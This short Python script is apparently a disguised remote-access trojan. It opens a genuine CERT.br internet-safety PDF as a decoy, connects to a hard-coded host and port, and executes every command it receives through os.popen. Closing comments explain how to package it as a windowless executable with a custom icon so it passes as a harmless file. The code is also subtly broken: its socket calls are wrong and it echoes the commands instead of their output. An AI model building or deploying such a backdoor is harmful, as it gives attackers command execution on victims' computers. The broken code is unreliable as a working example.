from socket import socket
from os import popen

url = 'https://cartilha.cert.br/livro/cartilha-seguranca-internet.pdf'

popen('explorer https://cartilha.cert.br/livro/cartilha-seguranca-internet.pdf')

ip = '192.168.0.10'
port = 80

sckt = socket(socket.AF_INET, socket.SOCK_STREAM)
sckt.connect((ip, port))

while True:
    cmd = sckt.recv(1024)
    if cmd == '':
        exit
    for opt in popen(cmd):
        sckt.send(cmd)

# pip install pyinstaller
# pyinstaller <path/file.exe> --onefile --windowed --icon=<path/file.ico>